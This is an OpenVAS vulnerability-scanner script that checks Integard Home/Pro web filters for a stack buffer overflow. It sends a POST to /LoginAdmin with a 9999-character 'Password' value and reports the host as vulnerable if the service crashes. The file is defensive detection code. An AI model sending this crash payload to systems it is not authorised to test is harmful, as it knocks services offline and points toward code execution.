###############################################################################
# OpenVAS Vulnerability Test
# $Id: secpod_integard_http_bof_vuln.nasl 14 2013-10-27 12:33:37Z jan $
#
# Integard Home and Pro HTTP Buffer Overflow Vulnerability
#
# Authors:
# Sooraj KS <kssooraj@secpod.com>
#
# Copyright:
# Copyright (c) 2010 SecPod, http://www.secpod.com
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation may allow remote attackers to execute arbitrary code
  on the system with elevated privileges or cause the application to crash.
  Impact Level: Application/System";
tag_affected = "Integard Home version prior to 2.0.0.9037
  Integard Pro version prior to 2.2.0.9037";
tag_insight = "The flaw is due to a boundary error within the web interface when
  processing certain HTTP requests. This can be exploited to cause a stack-based
  buffer overflow by sending specially crafted HTTP POST requests containing an
  overly long 'Password' parameter to the web interface.";
tag_solution = "Upgrade to Integard Pro version 2.2.0.9037 or Integard Home version 2.0.0.9037,
  For updates refer to http://www.raceriver.com/Download_Web_Filtering_Software.htm";
tag_summary = "The host is running Integard Home/Pro internet content filter HTTP
  server and is prone to buffer overflow vulnerability.";

if(description)
{
  script_id(901155);
  script_version("$Revision: 14 $");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:33:37 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2010-09-23 08:13:58 +0200 (Thu, 23 Sep 2010)");
  script_tag(name:"cvss_base", value:"6.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:P/I:P/A:P");
  script_tag(name:"risk_factor", value:"High");
  script_name("Integard Home and Pro HTTP Buffer Overflow Vulnerability");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://osvdb.org/67909");
  script_xref(name : "URL" , value : "http://secunia.com/advisories/41312");
  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/14941/");
  script_xref(name : "URL" , value : "http://www.corelan.be:8800/index.php/forum/security-advisories/corelan-10-061-integard-home-and-pro-v2-remote-http-buffer-overflow-exploit/");

  script_description(desc);
  script_summary("Determine if Integard is prone to a Buffer Overflow vulnerability");
  script_category(ACT_DENIAL);
  script_copyright("Copyright (C) 2010 SecPod");
  script_family("Buffer overflow");
  script_dependencies("http_version.nasl");
  script_require_ports("Services/www",18881);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");

## Check Integard Port Status
port = get_http_port(default:18881);
if(!get_port_state(port)){
  exit(0);
}

## Send and Recieve the response
req = http_get(item:"/", port:port);
res = http_keepalive_send_recv(port:port,data:req);

## Confirm the application
if('<title>Integard Login</title>' >< res)
{
  ## Construct Attack Request
  crash = "Password=" + crap(9999) + "&Redirect=%23%23%23REDIRECT%23%23%23&" +
          "NoJs=0&LoginButtonName=Login" ;

  ## Sending Attack
  req = http_post(port:port, item:"/LoginAdmin", data:crash);
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);

  ## Check Port Status
  if (http_is_dead(port: port))
  {
    security_hole(port);
    exit(0);
  }
}
